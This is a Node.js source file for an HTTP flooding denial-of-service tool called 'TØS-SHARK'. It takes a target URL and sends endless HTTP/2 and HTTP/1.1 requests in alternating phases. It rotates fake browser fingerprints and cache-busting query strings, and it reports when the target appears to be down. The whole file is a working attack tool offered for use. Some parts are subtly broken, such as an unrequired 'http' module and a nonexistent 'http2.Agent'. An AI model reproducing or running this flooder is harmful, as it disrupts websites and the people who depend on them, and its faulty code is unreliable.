const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(targetUrl) {
        const url = new URL(targetUrl);
        this.hostname = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.path = url.pathname || '/';
        this.targetUrl = targetUrl;
        
        this.running = true;
        this.startTime = Date.now();
        this.totalRequests = 0;
        this.requestCounter = 0;
        this.phase = 'H2_ATTACK';
        this.phaseStart = Date.now();
        this.nextPhaseChange = 0;
        this.lastStatusLog = Date.now();
        this.lastDownEvent = 0;
        this.isHostDown = false;
        
        // Protection Detection
        this.protection = this.detectProtection();
        this.mtCode = this.getMTCode();
        
        // H2 Connection Pool
        this.h2Connections = [];
        this.h2MaxConnections = 15;
        
        // H1 Agent
        this.h1Agent = null;
        
        // Fingerprints & Headers
        this.fingerprints = this.generateFingerprints();
        this.currentFingerprint = 0;
        this.routes = ['/', '/api', '/static', '/admin', '/data', '/users'];
        this.methods = ['GET', 'HEAD'];
        this.headerSets = this.generateHeaderSets();
        
        // Initialize
        this.init();
    }

    // ===== PROTECTION DETECTION =====
    detectProtection() {
        if (this.hostname.includes('vercel.app')) return 'VERCEL';
        return 'CUSTOM';
    }

    getMTCode() {
        const codes = {
            'CLOUDFLARE': '1M22',
            'VERCEL': '1M22Z',
            'CUSTOM': '3M22',
            'AKAMAI': '2M11'
        };
        return codes[this.protection] || '3M22';
    }

    // ===== LOGGING SYSTEM =====
    color(text, color) {
        const colors = {
            red: '\x1b[91m',
            green: '\x1b[92m',
            yellow: '\x1b[93m',
            blue: '\x1b[94m',
            magenta: '\x1b[95m',
            cyan: '\x1b[96m',
            white: '\x1b[97m',
            reset: '\x1b[0m'
        };
        return `${colors[color] || ''}${text}${colors.reset}`;
    }

    printHeader() {
        console.clear();
        console.log(`${this.color('TØS-SHARK', 'white')} | ${this.color(this.protection, 'red')} | MT-${this.mtCode}`);
        console.log(this.color('-----------------------------------------------------------------', 'cyan'));
    }

    logStatus(status, duration) {
        const now = Date.now();
        if (now - this.lastStatusLog >= 5000) {
            this.lastStatusLog = now;
            
            let color = 'green';
            let statusText = status;
            
            if (status === 'TIMEOUT') {
                color = 'red';
                statusText = 'TIMEOUT';
            } else if (status >= 500) {
                color = 'red';
                statusText = `${status}`;
            } else if (status >= 400) {
                color = 'yellow';
                statusText = `${status}`;
            } else if (status >= 300) {
                color = 'blue';
                statusText = `${status}`;
            } else {
                statusText = `${status}`;
            }
            
            const durationText = duration ? `${duration.toFixed(1)}s` : '0.0s';
            console.log(`STS-HAROP-INT ---> ${this.color(statusText, color)}:${durationText}`);
        }
    }

    logDownEvent(status) {
        const now = Date.now();
        if (!this.isHostDown && now - this.lastDownEvent > 1000) {
            this.isHostDown = true;
            this.lastDownEvent = now;
            
            const statusText = typeof status === 'number' ? status : status;
            const log = `{${this.mtCode}-${this.requestCounter} --> ${statusText}}`;
            console.log(this.color(log, 'red'));
        }
    }

    logHostRecovered() {
        if (this.isHostDown) {
            this.isHostDown = false;
        }
    }

    isDownStatus(status) {
        if (status === 'TIMEOUT' || status === 'ERROR') return true;
        if (typeof status === 'number') {
            if (status >= 500 && status < 600) return true;
            if ([429, 430, 431, 451].includes(status)) return true;
        }
        return false;
    }

    // ===== ATTACK ENGINE =====
    generateFingerprints() {
        const prints = [];
        for (let i = 0; i < 20; i++) {
            prints.push({
                userAgent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.${i}`,
                accept: '*/*',
                language: 'en-US,en;q=0.9'
            });
        }
        return prints;
    }

    generateHeaderSets() {
        const sets = [];
        for (let i = 0; i < 10; i++) {
            sets.push({
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache'
            });
        }
        return sets;
    }

    init() {
        this.printHeader();
        console.log(this.color(`Target: ${this.hostname}`, 'yellow'));
        console.log(this.color('Initializing attack engine...', 'green'));
        
        // Setup H1 agent
        this.h1Agent = this.isHttps ? 
            new https.Agent({ keepAlive: true, maxSockets: 50 }) :
            new http2.Agent({ keepAlive: true, maxSockets: 50 });
        
        // Start systems
        setTimeout(() => {
            this.startAttackCycle();
            this.startDisplay();
        }, 1000);
    }

    getRandomRoute() {
        return this.routes[Math.floor(Math.random() * this.routes.length)];
    }

    getRandomMethod() {
        return this.methods[Math.floor(Math.random() * this.methods.length)];
    }

    getRandomHeaders() {
        const fp = this.fingerprints[this.currentFingerprint];
        const headers = this.headerSets[Math.floor(Math.random() * this.headerSets.length)];
        return {
            ...headers,
            'user-agent': fp.userAgent
        };
    }

    async sendH2Request() {
        if (!this.isHttps) return { status: 'ERROR', duration: 0 };
        
        const startTime = Date.now();
        this.requestCounter++;
        
        try {
            // Create new H2 connection each time (simpler for Termux)
            const client = http2.connect(this.targetUrl);
            
            return new Promise((resolve) => {
                const timeout = setTimeout(() => {
                    client.destroy();
                    resolve({ status: 'TIMEOUT', duration: 5 });
                }, 5000);
                
                const method = this.getRandomMethod();
                const route = this.getRandomRoute();
                const headers = this.getRandomHeaders();
                
                const h2Headers = {
                    ':method': method,
                    ':path': `${route}?_=${Date.now()}`,
                    ':authority': this.hostname,
                    ...headers
                };
                
                const req = client.request(h2Headers);
                
                req.on('response', (responseHeaders) => {
                    clearTimeout(timeout);
                    const duration = (Date.now() - startTime) / 1000;
                    const status = responseHeaders[':status'];
                    client.destroy();
                    resolve({ status, duration });
                });
                
                req.on('error', (err) => {
                    clearTimeout(timeout);
                    const duration = (Date.now() - startTime) / 1000;
                    client.destroy();
                    resolve({ status: 'ERROR', duration });
                });
                
                req.end();
                
            });
            
        } catch (err) {
            return { status: 'ERROR', duration: 0 };
        }
    }

    async sendH1Request() {
        const startTime = Date.now();
        this.requestCounter++;
        
        return new Promise((resolve) => {
            const timeout = setTimeout(() => {
                resolve({ status: 'TIMEOUT', duration: 5 });
            }, 5000);
            
            const options = {
                hostname: this.hostname,
                path: `${this.getRandomRoute()}?h1=${Date.now()}`,
                method: 'GET',
                headers: { 'Connection': 'close' },
                timeout: 5000
            };
            
            // Use HTTPS for https:// targets
            const requestModule = this.isHttps ? https : http;
            
            const req = requestModule.request(options, (res) => {
                clearTimeout(timeout);
                const duration = (Date.now() - startTime) / 1000;
                resolve({ status: res.statusCode, duration });
                res.destroy();
            });
            
            req.on('error', (err) => {
                clearTimeout(timeout);
                const duration = (Date.now() - startTime) / 1000;
                resolve({ status: 'ERROR', duration });
            });
            
            req.on('timeout', () => {
                req.destroy();
                resolve({ status: 'TIMEOUT', duration: 5 });
            });
            
            req.end();
        });
    }

    async sendH3Request() {
        // Same as H1 for now
        return this.sendH1Request();
    }

    async startAttackCycle() {
        console.log(this.color('[+] Starting attack cycle', 'green'));
        
        while (this.running) {
            const now = Date.now();
            
            // Phase switching - simpler timing
            if (now >= this.nextPhaseChange) {
                if (this.phase === 'H2_ATTACK') {
                    this.phase = 'H1_H3_PHASE';
                    this.nextPhaseChange = now + 20000; // 20s H1/H3 phase
                    this.phaseStart = now;
                } else {
                    this.phase = 'H2_ATTACK';
                    this.nextPhaseChange = now + 120000; // 120s H2 attack
                    this.phaseStart = now;
                }
            }
            
            // Execute requests based on phase
            let result;
            if (this.phase === 'H2_ATTACK' && this.isHttps) {
                result = await this.sendH2Request();
                this.totalRequests++;
            } else {
                // H1/H3 phase
                if (Math.random() < 0.8) {
                    result = await this.sendH1Request();
                } else {
                    result = await this.sendH3Request();
                }
                this.totalRequests++;
            }
            
            // Process result and log
            if (result) {
                this.logStatus(result.status, result.duration);
                
                if (this.isDownStatus(result.status)) {
                    this.logDownEvent(result.status);
                } else {
                    this.logHostRecovered();
                }
            }
            
            // Small delay to prevent Termux crash
            await new Promise(resolve => setTimeout(resolve, 10));
        }
    }

    startDisplay() {
        const display = () => {
            if (!this.running) return;
            
            const runtime = Date.now() - this.startTime;
            const phaseTime = Date.now() - this.phaseStart;
            const phaseRemaining = Math.max(0, this.nextPhaseChange - Date.now());
            
            const hours = Math.floor(runtime / 3600000);
            const minutes = Math.floor((runtime % 3600000) / 60000);
            const seconds = Math.floor((runtime % 60000) / 1000);
            
            // Print header on each display update
            this.printHeader();
            
            // Stats
            console.log(`Target: ${this.color(this.hostname, 'yellow')}`);
            console.log(`Runtime: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
            console.log(`Phase: ${this.color(this.phase, this.phase === 'H2_ATTACK' ? 'green' : 'magenta')}`);
            console.log(`Phase Time: ${Math.round(phaseTime/1000)}s | Next: ${Math.round(phaseRemaining/1000)}s`);
            console.log(this.color('-----------------------------------------------------------------', 'cyan'));
            console.log(`Total Requests: ${this.color(this.totalRequests.toLocaleString(), 'green')}`);
            console.log(`Request #: ${this.requestCounter}`);
            console.log(`Protocol: ${this.isHttps ? 'HTTPS' : 'HTTP'}`);
            console.log(`Host Status: ${this.isHostDown ? this.color('DOWN', 'red') : this.color('UP', 'green')}`);
            console.log(this.color('-----------------------------------------------------------------', 'cyan'));
            
            // Calculate RPS
            const rps = this.totalRequests > 0 ? this.totalRequests / (runtime / 1000) : 0;
            console.log(`Average RPS: ${this.color(rps.toFixed(1), 'green')}`);
            
            setTimeout(display, 1000);
        };
        
        display();
    }

    stop() {
        this.running = false;
        process.exit(0);
    }
}

// Main execution
if (require.main === module) {
    if (process.argv.length !== 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    
    const target = process.argv[2];
    const shark = new TOS_SHARK(target);
    
    process.on('SIGINT', () => {
        shark.stop();
    });
}

module.exports = TOS_SHARK;
